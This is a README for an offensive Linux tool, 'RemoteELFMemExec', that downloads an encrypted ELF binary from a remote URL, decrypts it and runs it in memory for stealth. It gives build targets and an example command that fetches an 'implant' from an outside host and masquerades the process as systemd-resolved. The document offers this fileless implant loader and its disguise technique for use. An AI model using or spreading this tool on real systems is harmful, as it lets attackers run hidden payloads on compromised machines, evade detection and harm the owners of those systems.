
# RemoteELFMemExec

**RemoteELFMemExec** is a tool designed to download, decrypt, and execute ELF binaries directly in memory from a remote URL. This utility enables the execution of executable files without writing them to disk, leveraging memory-based execution for enhanced stealth and efficiency. The tool uses XOR encryption to securely decrypt the ELF binary before execution.


> **⚠️ Warning:** On legacy systems, such as CentOS 6, it is not possible to execute ELF files directly in memory due to the lack of support for the `memfd_create` function, introduced in Linux 3.17. In these environments, the process downloads the encrypted ELF file to disk, decrypts it, executes it, and then deletes it.

## Compilation

### Debug Mode
```bash

make

```
### Static Compilation
```bash

make  static

```
### Legacy Systems
```bash

make  legacy

```
### Static Compilation for Legacy Systems
```bash

make  legacy_static

```
## Usage
```bash

./elfMemExecutor  <Url>  <Key>  <Alias_process>

```
## Example
```bash

./elfMemExecutor  http://192.168.1.190/test_implant.enc  0331afffba74a654b4e8  "/lib/systemd/systemd-resolved"

```
![image](https://github.com/user-attachments/assets/697968a4-a874-4017-a082-87e4a9f3cc4d)

![image](https://github.com/user-attachments/assets/5de749c4-25a4-4d62-bc85-273fcc3c34a2)